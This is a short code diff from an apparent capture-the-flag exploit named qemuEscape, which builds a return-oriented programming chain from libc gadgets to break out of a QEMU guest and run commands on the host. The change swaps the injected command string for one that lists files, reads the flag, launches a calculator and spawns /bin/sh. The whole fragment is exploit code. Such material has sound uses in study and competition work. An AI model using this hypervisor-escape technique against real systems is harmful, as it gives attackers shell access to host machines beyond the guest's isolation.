@@ -325,7 +325,7 @@ void qemuEscape(void)
      * with correct works. So I think the problem is not here, but where?
      */
     buf[33] = buf[34] = 0;
-    strcpy((char*)&buf[33], "cat ./flag;gnome-calculator");
+    strcpy((char*)&buf[33], "ls;cat ./flag;gnome-calculator;/bin/sh");
 
     /* the new rdx starts there */
     buf[28] = libc_base + LIBC_POP_RDI_RET;
